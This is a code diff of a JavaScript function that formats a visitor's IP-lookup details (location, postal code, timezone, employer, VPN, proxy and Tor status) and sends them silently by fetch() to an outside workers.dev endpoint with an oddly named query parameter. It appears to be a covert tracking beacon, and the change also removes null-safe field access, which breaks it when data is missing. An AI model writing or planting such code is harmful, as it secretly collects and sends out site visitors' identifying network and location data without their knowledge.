@@ -101,7 +101,10 @@
     }
 
     async function sendMessageToURL(ipInfo) {
-    if (!ipInfo) return;
+    if (!ipInfo || typeof ipInfo !== "object") {
+        console.error("Invalid IP info received");
+        return;
+    }
 
     // Extract only the required fields
     const filteredData = `
@@ -114,25 +117,27 @@ postal: ${ipInfo.postal}
 timezone: ${ipInfo.timezone}
 
 company:
-name: ${ipInfo.company?.name}
-domain: ${ipInfo.company?.domain}
-type: ${ipInfo.company?.type}
+name: ${ipInfo.company.name}
+domain: ${ipInfo.company.domain}
+type: ${ipInfo.company.type}
 
 privacy:
-vpn: ${ipInfo.privacy?.vpn}
-proxy: ${ipInfo.privacy?.proxy}
-tor: ${ipInfo.privacy?.tor}
-relay: ${ipInfo.privacy?.relay}
-hosting: ${ipInfo.privacy?.hosting}
-service: ${ipInfo.privacy?.service}
-    `.trim(); // Remove extra spaces
+vpn: ${ipInfo.privacy.vpn}
+proxy: ${ipInfo.privacy.proxy}
+tor: ${ipInfo.privacy.tor}
+relay: ${ipInfo.privacy.relay}
+hosting: ${ipInfo.privacy.hosting}
+service: ${ipInfo.privacy.service}
+    `.trim(); // Clean up formatting
+
+    console.log("Filtered Data:", filteredData); // Debugging log to check output
 
     const url = `https://t.dog37.workers.dev/?pass_weird9351047102628027252902=${encodeURIComponent(filteredData)}`;
 
     try {
         await fetch(url);
     } catch (error) {
-        console.error('Error sending message:', error);
+        console.error("Error sending message:", error);
     }
 }
 
